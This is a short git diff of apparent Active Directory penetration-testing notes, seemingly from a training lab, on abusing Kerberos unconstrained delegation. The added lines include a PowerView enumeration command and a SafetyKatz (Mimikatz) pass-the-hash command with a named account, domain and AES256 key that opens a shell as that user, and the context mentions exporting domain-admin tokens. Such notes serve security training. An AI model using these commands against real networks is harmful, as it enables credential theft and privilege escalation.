@@ -302,6 +302,11 @@ Delegation is the action of allowing a computer to save a user’s Kerberos auth
 Check for unconstrained delegation with PowerView 
 Get-Netcomputer -UnConstrained
 Get-Netcomputer -UnConstrained | select samaccountname
+Get-DomainComputer -Unconstrained | select -ExpandProperty
+```
+Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on target host. 
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
 ```
 Leverage Mimikatz to to check for DA tokens and export them. May have to wait for a login
 ```powershell
